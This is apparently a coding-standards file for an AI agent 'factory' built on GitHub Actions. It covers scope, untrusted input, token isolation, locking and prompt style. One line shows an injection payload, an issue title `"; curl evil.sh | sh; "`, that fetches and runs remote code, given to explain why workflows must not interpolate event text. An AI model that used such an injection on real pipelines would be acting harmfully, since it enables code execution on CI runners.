# Coding standards

The rules for the factory's own code: its workflows, Sandcastle scripts and
prompts. A target repo's standards come from its ICM map, never from this
file. Each heading is a rule a review can cite.

## Do what the ticket asked

A ticket to retry failed pushes ships a retry. A new label, a new task, a new
setting or a refactor of the workflow next door is scope the ticket did not
ask for. Remove it, or file it as a follow-up ticket.

## Name things in the glossary's language

Files, variables, labels and prose use the `software-factory` skill's terms
and those in [GLOSSARY.md](GLOSSARY.md). A concept with no term gets one in
GLOSSARY.md before it gets a name in code. A variable called `job` that holds
a run is two vocabularies in one line, and the next agent will extend the
wrong one.

## Treat every ticket, comment and diff as untrusted input

A run reads text written by people the factory does not control, upstream
maintainers and strangers among them. That text is data, never instructions
to the host steps. Pass it to the agent through a file or a prompt variable,
never by interpolating `${{ github.event.* }}` into a `run:` script.

```yaml
# Good: the title reaches the script as an env var, quoted by the shell.
env:
  TITLE: ${{ github.event.issue.title }}
run: echo "$TITLE"
```

An issue titled `"; curl evil.sh | sh; "` runs as shell when it is interpolated
directly into the script.

## Check who triggered the run, in the run

A label is an approval only if a collaborator applied it. Each workflow
checks the actor's permission itself before doing anything. It never relies
on the repo's settings, or on another workflow having checked first. They
are separate runs.

## Parse what the agent returns with a strict schema

Anything a host step reads from an agent is a `z.strictObject` from `zod/v4`,
with `.describe()` on every field written as an instruction to the agent. It
is produced with `runWithExtraction` and written with `writeJson` to
`OUTPUT_DIR`. Parse once, at that edge; after it the value has a type and
nothing checks it again. Agent output that "looks like JSON" and is read with
`jq` breaks on the first run that wraps it in prose.

## Fail by throwing, loudly, at the top

A script that cannot continue throws or exits non-zero. It never returns
half a result for the workflow to unpack. Read every env var through
`required()`, so a missing secret fails at the first line instead of at the
push forty minutes later. In shell steps, start with `set -euo pipefail`.

## Keep tokens out of the agent's reach

- Set `GH_TOKEN` on the steps that call GitHub, never on a job that runs repo
  or agent code.
- Use `persist-credentials: false` on every checkout.
- Shrink `GITHUB_TOKEN` with `permissions:` to what the checkout needs.
- Give the agent's step, and every step that runs code the agent wrote, no
  GitHub token. The agent commits; a later host step pushes.
- Check out PR code under `pull_request`, never `pull_request_target`.

## Leave a state the next run can read

GitHub has no transactions. A run that changes several things (labels, a
branch, a PR, a comment) orders them so that stopping after any one of them
leaves a state the next run recognises, and makes each step safe to repeat.
`gh label create ... || true` is that rule in miniature. A run that opens the
PR before pushing the branch dies with a PR pointing at nothing.

## Derive state from the tracker, do not store it

The ticket tracker and the git host are the factory's memory. A run works out
"is this in progress?" from labels and PRs, not from a file or cache that
must agree with them. Two records of one fact will disagree on the day it
matters.

## One label starts a task

A task's trigger is one `agent:<task>` label. The run removes it first, so
re-applying it is the retry. The run holds `agent:in-progress` while it runs.
On failure it sets `agent:blocked` and comments with how to retry.

## Define each label and branch name once

A label name or branch pattern that code compares against is defined in one
place and read from there. `agent:in-progress` typed by hand in six workflows
will be `agent:in_progress` in the seventh, and that task will never look
busy.

## Runs never collide or lose work

- Lock with run names, never with Actions `concurrency:` groups. A
  concurrency group keeps one waiting run and cancels the rest, so a third
  label is lost. Every run's name carries its lock key, written and parsed by
  `shared/run-name.ts`; the gate run lists the runs in flight and, when an
  earlier one holds the same key, labels the item `factory:queued` and ends.
  Runs for labels that are not the trigger get a name that parses as no lock
  key. Only the requeue run keeps a concurrency group, because a dropped copy
  of it loses nothing.
- Every run pushes to a branch of its own, suffixed with the run id.
- Every job sets `timeout-minutes`.

## Do not call the GitHub API in a loop

One `gh` call per issue is N calls against a rate limit the whole factory
shares. Fetch the batch in one call, with a search query or GraphQL. An
explore run that labels forty tickets one API call at a time is the run that
starves every other task of quota.

## Paginate anything that can grow

Comments, review threads, labels and issue lists are paginated by GitHub.
Use `gh api --paginate`, or an explicit page loop. A query that reads only
the first page works on a fresh repo and silently drops the 31st comment on
a real one, and that is usually the maintainer's.

## Inject the clock and the randomness

A function that decides by time (a throttle window, a trust-ladder period,
a stale-map check) takes the time as an argument, so a test can pin it. The
same goes for anything random. `Date.now()` inside the logic makes the test
pass at noon and fail at midnight.

## One folder per task

`.sandcastle/agent-workflows/<task>/` holds the task's script, its
`prompt.md` beside it, and its `<name>-schema.ts` if it returns structured
output. Code two tasks share lives in `shared/`. The agent and its model are
chosen in one place, `shared/common.ts`.

## Scripts are small ESM TypeScript

Use top-level `await`, `node:`-prefixed imports, and `import.meta.dirname` for
paths next to the script. Mark option and result types `readonly`.

## Keep files under 5000 tokens

Keep every file, prompts included, under 5000 tokens. A run's agent reads the
whole file, so every token past that is paid for on every run.

## Prompts state what to do

Prompts address the agent as "you", describe the target behaviour positively,
and point at skills by path rather than restating them. Template variables
are `{{UPPER_SNAKE}}`. A prompt that says "do not push" puts pushing in the
agent's head. Say "the workflow pushes your commits" instead.

## Keep why out of comments

Name and extract until a comment is unnecessary. A comment that restates
_what_ the code does goes stale the first time the code changes. A product
decision or a long _why_ goes in an ADR in `docs/adr/`, with a one-line link
at most. A diff that adds several why-comments is a finding in itself: the
decision was never written down.

The exception is a workflow's header. It is its operator's manual, in three
sections: `WHAT TRIGGERS IT`, `WHAT IT DOES`, `WHAT IT NEEDS` (secrets, labels,
one-time setup). It is the single source of truth for operating that task.
A change to the trigger, the tokens or the setup updates it in the same
commit.

## A move is a move

A commit that moves code leaves its behaviour alone. Put a behaviour change,
even one flag, in its own commit, or name it in the message. A reader trusts
"moved verbatim" and skips the diff.

## Code that moves starts clean

Moving code into a new file is the moment to retire its debt: split the long
function, flatten the nesting, bring it under this file's rules.
